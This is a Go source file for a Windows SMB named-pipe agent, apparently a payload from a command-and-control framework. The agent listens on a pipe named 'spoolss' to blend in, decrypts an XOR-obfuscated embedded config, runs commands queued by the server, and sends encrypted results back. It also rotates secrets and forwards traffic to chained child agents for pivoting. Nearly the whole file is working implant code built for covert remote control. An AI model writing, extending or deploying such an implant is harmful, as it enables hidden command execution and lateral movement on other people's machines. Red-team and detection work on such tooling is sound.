// server/docker/payloads/SMB_Windows/main.go
// SMB-based Windows agent that communicates via named pipes

//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// Configuration variables - will be replaced at compile time via -ldflags
var (
	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
	xorKey = ""

	// Embedded encrypted configuration blob (XOR encrypted with decrypted secret)
	encryptedConfig = ""

	// Initial client ID from build
	clientID = ""

	// Current sleep interval (seconds) and jitter (percentage)
	sleep  = "30"
	jitter = "10"

	// Secret for encryption (XOR encrypted with xorKey, decrypted at runtime)
	secret = ""

	// Pipe name for the named pipe listener
	pipeName = "spoolss"

	// Debug mode
	debugMode = "false"
)

// Global managers
var (
	pipeListener  *PipeListener
	commandQueue  *CommandQueue
	resultManager *ResultManager
	secureComms   *SecureComms
)

func main() {
	if debugMode == "true" {
		log.SetFlags(log.LstdFlags | log.Lshortfile)
		log.SetPrefix("[SMB Agent] ")
	} else {
		// Minimal logging in production
		log.SetOutput(os.Stderr)
		log.SetPrefix("")
		log.SetFlags(0)
	}

	logDebug("Starting...")

	// Decrypt embedded configuration
	config, err := decryptConfig(encryptedConfig)
	if err != nil {
		logDebug("Failed to decrypt config: %v", err)
		os.Exit(1)
	}

	logDebug("Configuration loaded")

	// Initialize command queue and result manager
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()

	// Create the named pipe listener using the global pipeName variable
	// (set via ldflags during build, defaults to "spoolss")
	activePipeName := pipeName
	if configPipe, ok := config["Pipe Name"]; ok && configPipe != "" {
		activePipeName = configPipe // Override with config if present
	}

	pipeListener, err = NewPipeListener(activePipeName)
	if err != nil {
		logDebug("Failed to create pipe listener: %v", err)
		os.Exit(1)
	}

	logDebug("Listening on pipe: %s", pipeListener.GetPipePath())

	// Handle shutdown gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		logDebug("Shutdown signal received")
		pipeListener.Close()
		os.Exit(0)
	}()

	// Main loop - wait for connections from HTTPS agents
	for {
		conn, err := pipeListener.Accept()
		if err != nil {
			logDebug("Accept error: %v", err)
			time.Sleep(time.Second)
			continue
		}

		logDebug("New connection from HTTPS agent")

		// Handle connection in a goroutine
		go handleConnection(conn, config)
	}
}

func handleConnection(conn *PipeConnection, config map[string]string) {
	defer func() {
		conn.Close()
		logDebug("Connection closed")
	}()

	// Perform authentication with the connecting HTTPS agent
	if err := performAuth(conn); err != nil {
		logDebug("Authentication failed: %v", err)
		return
	}

	logDebug("Authentication successful")

	// Always perform handshake for each new connection
	// Even if we already have clientID/keys, the connecting HTTPS agent needs
	// to receive our handshake data to complete the link
	if err := performHandshake(conn, config); err != nil {
		logDebug("Handshake failed: %v", err)
		return
	}
	logDebug("Handshake complete, clientID=%s", clientID)

	// Main message loop
	log.Printf("[SMB] Entering main message loop")
	for {
		// Read message from HTTPS agent
		log.Printf("[SMB] Waiting to read message from pipe...")
		message, err := conn.ReadMessage()
		if err != nil {
			log.Printf("[SMB] Read error: %v", err)
			logDebug("Read error: %v", err)
			return
		}

		log.Printf("[SMB] Received message, length=%d", len(message))

		// Parse message type
		var msgEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(message, &msgEnvelope); err != nil {
			log.Printf("[SMB] Invalid message format: %v", err)
			logDebug("Invalid message format: %v", err)
			continue
		}

		log.Printf("[SMB] Message type: %s", msgEnvelope.Type)

		switch msgEnvelope.Type {
		case "data":
			// Commands from server
			log.Printf("[SMB] Processing data message (commands)")
			handleServerData(conn, msgEnvelope.Payload)

		case "handshake_response":
			// Response to our handshake - handled separately
			log.Printf("[SMB] Received handshake_response in main loop (unexpected)")
			handleHandshakeResponse(conn, msgEnvelope.Payload)

		case "disconnect":
			log.Printf("[SMB] Disconnect requested")
			logDebug("Disconnect requested")
			return

		default:
			log.Printf("[SMB] Unknown message type: %s", msgEnvelope.Type)
			logDebug("Unknown message type: %s", msgEnvelope.Type)
		}
	}
}

func handleServerData(conn *PipeConnection, encryptedPayload string) {
	log.Printf("[SMB] handleServerData called, payload length=%d", len(encryptedPayload))

	if secureComms == nil {
		log.Printf("[SMB] SecureComms not initialized!")
		logDebug("SecureComms not initialized")
		return
	}

	// Decrypt the payload
	log.Printf("[SMB] Decrypting payload...")
	decrypted, err := secureComms.DecryptMessage(encryptedPayload)
	if err != nil {
		log.Printf("[SMB] Failed to decrypt payload: %v", err)
		logDebug("Failed to decrypt payload: %v", err)
		return
	}

	log.Printf("[SMB] Decrypted payload: %s", decrypted)

	// Parse as JSON to check for nested link commands
	var payloadData map[string]interface{}
	if err := json.Unmarshal([]byte(decrypted), &payloadData); err != nil {
		// Legacy format - just commands array
		if err := commandQueue.AddCommands(decrypted); err != nil {
			log.Printf("[SMB] Failed to add commands: %v", err)
			logDebug("Failed to add commands: %v", err)
			return
		}
	} else {
		// New format - may have commands and/or link data

		// Process handshake responses for child agents FIRST (before commands)
		if linkRespVal, ok := payloadData["lr"]; ok {
			if linkRespData, ok := linkRespVal.([]interface{}); ok {
				log.Printf("[SMB LinkManager] Processing %d handshake responses for child agents", len(linkRespData))
				processLinkHandshakeResponses(linkRespData)
			}
		}

		// Process link commands for child agents (forward to linked SMB agents)
		if linkCmdsVal, ok := payloadData["lc"]; ok {
			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
				log.Printf("[SMB LinkManager] Processing %d link commands for child agents", len(linkCmdsData))
				processLinkCommands(linkCmdsData)
			}
		}

		// Extract commands array if present
		if cmdsVal, ok := payloadData["commands"]; ok {
			cmdsJSON, err := json.Marshal(cmdsVal)
			if err == nil {
				if err := commandQueue.AddCommands(string(cmdsJSON)); err != nil {
					log.Printf("[SMB] Failed to add commands: %v", err)
				}
			}
		}
		// Note: If payload has lr/lc fields but no commands, that's valid (just forwarding to children)
		// Don't try to parse as legacy format - that would fail on the JSON object
	}

	log.Printf("[SMB] Commands added to queue, processing...")

	// Process commands
	processedCount := 0
	for {
		result, err := commandQueue.ProcessNextCommand()
		if err != nil {
			log.Printf("[SMB] Error processing command: %v", err)
			continue
		}
		if result == nil {
			break
		}

		processedCount++
		log.Printf("[SMB] Processed command %d: %s, exit_code=%d", processedCount, result.Command.Command, result.ExitCode)

		// Add result to manager
		resultManager.AddResult(result)
	}

	log.Printf("[SMB] Processed %d commands, checking for results to send", processedCount)

	// Collect link data from child SMB agents (if any)
	lm := GetLinkManager()
	linkData := lm.GetOutboundData()
	unlinkNotifications := lm.GetUnlinkNotifications()

	hasResults := resultManager.HasResults()
	hasLinkData := len(linkData) > 0
	hasUnlinkNotifications := len(unlinkNotifications) > 0

	// Send results back (including any link data from child agents)
	if hasResults || hasLinkData || hasUnlinkNotifications {
		results := resultManager.GetPendingResults()
		log.Printf("[SMB] Sending %d results back to parent (linkData=%d, unlinkNotifications=%d)",
			len(results), len(linkData), len(unlinkNotifications))

		payload := map[string]interface{}{
			"agent_id": clientID,
		}

		if len(results) > 0 {
			payload["results"] = results
		}

		// Include link data from child agents (to be forwarded up the chain)
		if hasLinkData {
			log.Printf("[SMB LinkManager] Including %d link data items in response to parent", len(linkData))
			payload["ld"] = linkData
		}

		// Include unlink notifications from child agents
		if hasUnlinkNotifications {
			log.Printf("[SMB LinkManager] Including %d unlink notifications in response to parent", len(unlinkNotifications))
			payload["lu"] = unlinkNotifications
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			log.Printf("[SMB] Failed to marshal results: %v", err)
			logDebug("Failed to marshal results: %v", err)
			return
		}

		// Encrypt with our secret
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			log.Printf("[SMB] Failed to encrypt results: %v", err)
			logDebug("Failed to encrypt results: %v", err)
			return
		}

		// Send back through pipe
		response := map[string]string{
			"type":    "data",
			"payload": encrypted,
		}
		respJSON, _ := json.Marshal(response)
		log.Printf("[SMB] Sending response back through pipe, length=%d", len(respJSON))
		if err := conn.WriteMessage(respJSON); err != nil {
			log.Printf("[SMB] Failed to send results: %v", err)
			logDebug("Failed to send results: %v", err)
		} else {
			log.Printf("[SMB] Successfully sent results back")
		}

		// Rotate secret
		secureComms.RotateSecret()
		log.Printf("[SMB] Secret rotated")
	} else {
		log.Printf("[SMB] No results to send")
		// Still need to send an empty response so parent knows we're done
		// and can proceed with the next command cycle
		emptyPayload := map[string]interface{}{
			"agent_id": clientID,
		}
		jsonData, _ := json.Marshal(emptyPayload)
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			log.Printf("[SMB] Failed to encrypt empty response: %v", err)
			return
		}
		response := map[string]string{
			"type":    "data",
			"payload": encrypted,
		}
		respJSON, _ := json.Marshal(response)
		if err := conn.WriteMessage(respJSON); err != nil {
			log.Printf("[SMB] Failed to send empty response: %v", err)
		}
		secureComms.RotateSecret()
	}
}

func handleHandshakeResponse(conn *PipeConnection, payload string) {
	// This is called when we receive a handshake response from the server
	// The actual handling is done in the handshake.go performHandshake flow
	logDebug("Received handshake response")
}

func logDebug(format string, v ...interface{}) {
	if debugMode == "true" {
		log.Printf(format, v...)
	}
}

// processLinkCommands forwards commands from parent to linked (child) SMB agents
func processLinkCommands(linkCmds []interface{}) {
	lm := GetLinkManager()

	for _, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			log.Printf("[SMB LinkManager] Invalid link command format")
			continue
		}

		routingID, _ := cmdMap["r"].(string)
		payload, _ := cmdMap["p"].(string)

		if routingID == "" || payload == "" {
			log.Printf("[SMB LinkManager] Missing routing_id or payload in link command")
			continue
		}

		// Forward to the linked agent
		if err := lm.ForwardToLinkedAgent(routingID, payload); err != nil {
			log.Printf("[SMB LinkManager] Failed to forward command to %s: %v", routingID, err)
			continue
		}

		log.Printf("[SMB LinkManager] Forwarded command to linked agent %s", routingID)
	}
}

// processLinkHandshakeResponses forwards handshake responses from parent to child SMB agents
func processLinkHandshakeResponses(linkResps []interface{}) {
	lm := GetLinkManager()

	for _, resp := range linkResps {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			log.Printf("[SMB LinkManager] Invalid handshake response format")
			continue
		}

		routingID, _ := respMap["r"].(string)
		payload, _ := respMap["p"].(string)

		if routingID == "" || payload == "" {
			log.Printf("[SMB LinkManager] Missing routing_id or payload in handshake response")
			continue
		}

		// Get the link
		link, exists := lm.GetLink(routingID)
		if !exists {
			log.Printf("[SMB LinkManager] No link found for routing_id %s", routingID)
			continue
		}

		// Send handshake response to child SMB agent
		message := map[string]string{
			"type":    "handshake_response",
			"payload": payload,
		}

		msgJSON, err := json.Marshal(message)
		if err != nil {
			log.Printf("[SMB LinkManager] Failed to marshal handshake response: %v", err)
			continue
		}

		link.mu.Lock()
		err = writeMessage(link.Conn, msgJSON)
		link.mu.Unlock()

		if err != nil {
			log.Printf("[SMB LinkManager] Failed to send handshake response to %s: %v", routingID, err)
			continue
		}

		log.Printf("[SMB LinkManager] Sent handshake response to linked agent %s", routingID)
	}
}
